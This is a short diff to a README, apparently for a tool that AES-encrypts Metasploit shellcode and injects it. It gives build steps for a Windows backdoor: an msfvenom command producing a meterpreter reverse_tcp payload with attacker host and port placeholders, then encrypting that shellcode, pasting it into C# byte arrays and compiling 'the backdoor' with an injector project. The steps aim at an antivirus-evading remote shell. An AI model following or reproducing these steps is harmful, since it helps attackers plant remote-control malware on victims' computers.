@@ -23,13 +23,14 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp  -i 10 LHOST=(IP) LPORT=(PORT) -
 open the shelloader and add the bytes to the AESEncrytion Tool
 ```
 
-## Add the crypted shellcode on main.cpp
-Now that you have the encrypted shellcode you need to add it on the main.cpp file just like this:
+## Add the crypted shellcode on Program.cs in AESEncrptor
+Now that you have the shellcode you need to add it on the Program.cs file just like this:
 ```
 byte[] buf = new byte[] { /*shellcode*/ };
 ```
+Now Run the Project
 
-## Run The Encrpter
+## Compile The Backdoor
 Once You Get the Encoded Shellcode open the AESInjector Project and paste the shellcode into
 ```
 byte[] duffer = new byte[] { /*shellcode*/ };
